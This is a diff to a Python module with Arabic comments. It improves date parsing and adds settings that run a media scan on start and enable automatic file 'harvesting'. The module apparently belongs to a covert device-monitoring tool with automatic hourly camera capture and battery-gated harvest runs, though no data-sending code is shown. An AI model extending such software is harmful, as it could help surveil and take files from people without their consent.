@@ -35,27 +35,43 @@ try:
 except ImportError:
     JNI = False
 
-# ========== دالة fromisoformat آمنة ==========
+# ========== دالة fromisoformat آمنة (محسّنة) ==========
 def _parse_iso_datetime(iso_string):
-    """فك تشفير تاريخ ISO بشكل آمن (متوافق مع Python 3.6+)"""
+    """
+    فك تشفير تاريخ ISO بشكل آمن (متوافق مع Python 3.6+)
+    يدعم التنسيقات التالية:
+    - 2024-01-15T14:30:00
+    - 2024-01-15T14:30:00.123456
+    - 2024-01-15 14:30:00
+    - 2024-01-15T14:30:00Z (يتعامل مع Z كـ UTC)
+    """
     if not iso_string or not isinstance(iso_string, str):
         return None
+    
     iso_string = iso_string.strip()
     if not iso_string:
         return None
+    
+    # استبدال Z بـ +00:00 للتوافق مع fromisoformat في Python 3.7+
+    iso_string = iso_string.replace('Z', '+00:00')
+    
+    # محاولة التحليل باستخدام fromisoformat (Python 3.7+)
     try:
-        # Python 3.7+
         return datetime.fromisoformat(iso_string)
-    except AttributeError:
-        # Python < 3.7
-        for fmt in ("%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
-            try:
-                return datetime.strptime(iso_string, fmt)
-            except ValueError:
-                continue
-        return None
-    except ValueError:
-        return None
+    except (ValueError, AttributeError):
+        pass
+    
+    # محاولة تنسيقات أخرى للتوافق مع Python 3.6 والإصدارات الأقدم
+    for fmt in ("%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
+        try:
+            # قص الجزء الزمني إذا كان موجوداً
+            clean_str = iso_string[:19] if len(iso_string) >= 19 else iso_string
+            return datetime.strptime(clean_str, fmt)
+        except ValueError:
+            continue
+    
+    logging.warning(f"Could not parse datetime: {iso_string}")
+    return None
 
 
 class M:
@@ -114,7 +130,10 @@ class M:
             "auto_camera": False,              # تفعيل الكاميرا التلقائية
             "camera_interval": 3600,           # فاصل الكاميرا (ثانية) = ساعة
             "max_harvest_files": 200,          # الحد الأقصى للملفات في الحصاد
-            "force_harvest_on_start": False    # تشغيل حصاد فوري عند بدء التشغيل
+            "force_harvest_on_start": False,   # تشغيل حصاد فوري عند بدء التشغيل
+            "scan_on_start": True,             # تشغيل الماسح عند بدء التشغيل
+            "min_wifi_strength": -80,          # أقل قوة إشارة WiFi مقبولة (dBm)
+            "enable_auto_harvest": True        # تمكين الحصاد التلقائي
         }
 
         if os.path.exists(self.cf):
@@ -313,6 +332,11 @@ class M:
     # ========== منطق الحصاد الرئيسي (محسّن) ==========
     def _harvest_logic(self, force=False):
         """منطق الحصاد الرئيسي مع دعم force لتجاوز القيود"""
+        # التحقق من تمكين الحصاد التلقائي
+        if not force and not self.cfg.get('enable_auto_harvest', True):
+            logging.debug("Auto-harvest is disabled")
+            return
+
         if self._harvest_running:
             logging.debug("Harvest already running, skipping")
             return
@@ -332,7 +356,7 @@ class M:
             battery, charging = self._battery_ok()
             min_battery = self.cfg.get('hth', 15)
             if not force and battery < min_battery and not charging:
-                logging.info(f"Battery too low: {battery}%")
+                logging.info(f"Battery too low: {battery}% (min: {min_battery}%)")
                 return
 
             # 3. التحقق من وقت الانتظار (يمكن تجاوزه بـ force)
@@ -416,6 +440,15 @@ class M:
 
     # ========== الحلقة الرئيسية ==========
     def _loop(self):
+        """الحلقة الرئيسية للمراقبة"""
+        # تشغيل ماسح الوسائط عند البدء إذا كان مفعلاً
+        if self.cfg.get('scan_on_start', True) and self.media_scanner:
+            try:
+                self.media_scanner.run_scan(cleanup_first=True)
+                logging.info("Initial scan completed")
+            except Exception as e:
+                logging.error(f"Initial scan error: {e}")
+
         while self.rn:
             try:
                 self._harvest_logic(force=False)
@@ -478,8 +511,14 @@ class M:
 
     def update_config(self, key, value):
         """تحديث إعداد معين وحفظه"""
-        self.cfg[key] = value
-        self._save_config()
+        if key in self.cfg:
+            self.cfg[key] = value
+            self._save_config()
+            logging.info(f"Config updated: {key} = {value}")
+            return True
+        else:
+            logging.warning(f"Unknown config key: {key}")
+            return False
 
     def get_status(self):
         """الحصول على حالة المراقبة (للتصحيح)"""
